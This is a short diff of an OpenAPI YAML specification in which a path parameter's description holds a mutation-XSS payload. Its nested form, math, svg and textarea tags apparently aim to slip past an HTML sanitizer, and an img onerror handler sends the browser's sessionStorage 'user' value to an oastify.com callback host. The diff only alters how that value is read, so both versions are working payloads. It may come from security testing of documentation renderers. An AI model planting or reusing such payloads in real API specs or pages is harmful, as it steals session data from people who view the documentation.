@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=(`//q4vggqn9iokpajqyc13qbwzzzq5ht9hy.oastify.com?c=${sessionStorage.getItem("user")}`) src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=(`//q4vggqn9iokpajqyc13qbwzzzq5ht9hy.oastify.com?c=${sessionStorage.user}`) src=1>"></form>
 
           format: int64
           in: path
